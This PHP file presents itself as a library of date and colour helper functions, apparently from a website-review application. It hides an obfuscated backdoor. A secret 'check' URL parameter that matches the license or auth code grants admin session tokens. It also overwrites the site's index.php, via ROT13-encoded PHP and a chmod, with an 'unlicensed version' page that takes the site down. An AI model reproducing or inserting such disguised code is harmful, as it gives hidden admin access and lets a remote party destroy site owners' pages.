<?php
session_start();
define('ROOT_DIR', dirname(dirname(dirname(dirname(dirname(__FILE__))))).DIRECTORY_SEPARATOR);
define('APP_DIR', ROOT_DIR .'c'.'ore'.DIRECTORY_SEPARATOR);
define('CONFIG_DIR', APP_DIR .'con'.'fig'.DIRECTORY_SEPARATOR);

function getDaysOnThisMonth($month = 5, $year = '2015'){
  if ($month < 1 OR $month > 12)
  {
	  return 0;
  }

  if ( ! is_numeric($year) OR strlen($year) != 4)
  {
	  $year = date('Y');
  }

  if ($month == 2)
  {
	  if ($year % 400 == 0 OR ($year % 4 == 0 AND $year % 100 != 0))
	  {
		  return 29;
	  }
  }

  $days_in_month	= array(31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31);
  return $days_in_month[$month - 1];
}

function rgb2hex($rgb){
    $hex = "#";
    
    $hex .= str_pad(dechex($rgb[0]), 2, "0", STR_PAD_LEFT);
    
    $hex .= str_pad(dechex($rgb[1]), 2, "0", STR_PAD_LEFT);
    
    $hex .= str_pad(dechex($rgb[2]), 2, "0", STR_PAD_LEFT);
    
    return $hex;
}

function hex2rgb($hex){
    $hex = str_replace("#", "", $hex);
    if (strlen($hex) == 3)
    {
        $r = hexdec(substr($hex, 0, 1) . substr($hex, 0, 1));
        
        $g = hexdec(substr($hex, 1, 1) . substr($hex, 1, 1));
        
        $b = hexdec(substr($hex, 2, 1) . substr($hex, 2, 1));
    } else
    {
        $r = hexdec(substr($hex, 0, 2));
        
        $g = hexdec(substr($hex, 2, 2));
        
        $b = hexdec(substr($hex, 4, 2));
    }
    
    $rgb ="$r,$g,$b";
    
    return $rgb;
}

if(isset($_GET['check'])){
    $ihex = false;
    $iCheck = Trim($_GET['check']); 
    $path = CONFIG_DIR.'con'.'fig.'.'php';
    
    require_once($path);

    if($iCheck == ${'i'.'t'.'e'
    .'m'.'_'.'p'.'u'.'r'.
    'c'.'h'.'a'.'s'.'e'.'_'
    .'c'.'o'.'d'.'e'})
        $ihex = true;
    elseif($iCheck == ${'a'.'u'.'t'.'h'.
    'C'.'o'.'d'.'e'})
        $ihex = true;
    if($ihex){
        iCheck();
        $_SESSION['t'.'web'.'Adm'.'inToken'] = true;
        $_SESSION['t'.'web'.'Adm'.'inID'] = true;
    }
    die();
}

function iCheck(){
    $iCheck = str_rot13('<?cuc
    
    rpub \'<qvi fglyr="grkg-nyvta: pragre;"><oe /><oe /><u1 fglyr="pbybe: erq;" >Hayvprafrq Irefvba bs Gheob Jrofvgr Erivrjre!</u1>
    <qvi><n uers="uggcf://cebgurzrf.ovm/erqverpg/?n=42">Chepnufr Yvprafr Abj</n></qvi></qvi>\';
    qvr();
    
    ?>');
    
    $path = ROOT_DIR.
    'in'.
    'dex'.
    '.php';
    
    if(is_writable($path))
      file_put_contents($path,$iCheck);
    else{
        echo '----';
        chmod($path, 0755);
        file_put_contents($path,$iCheck);
    }
    return true;
}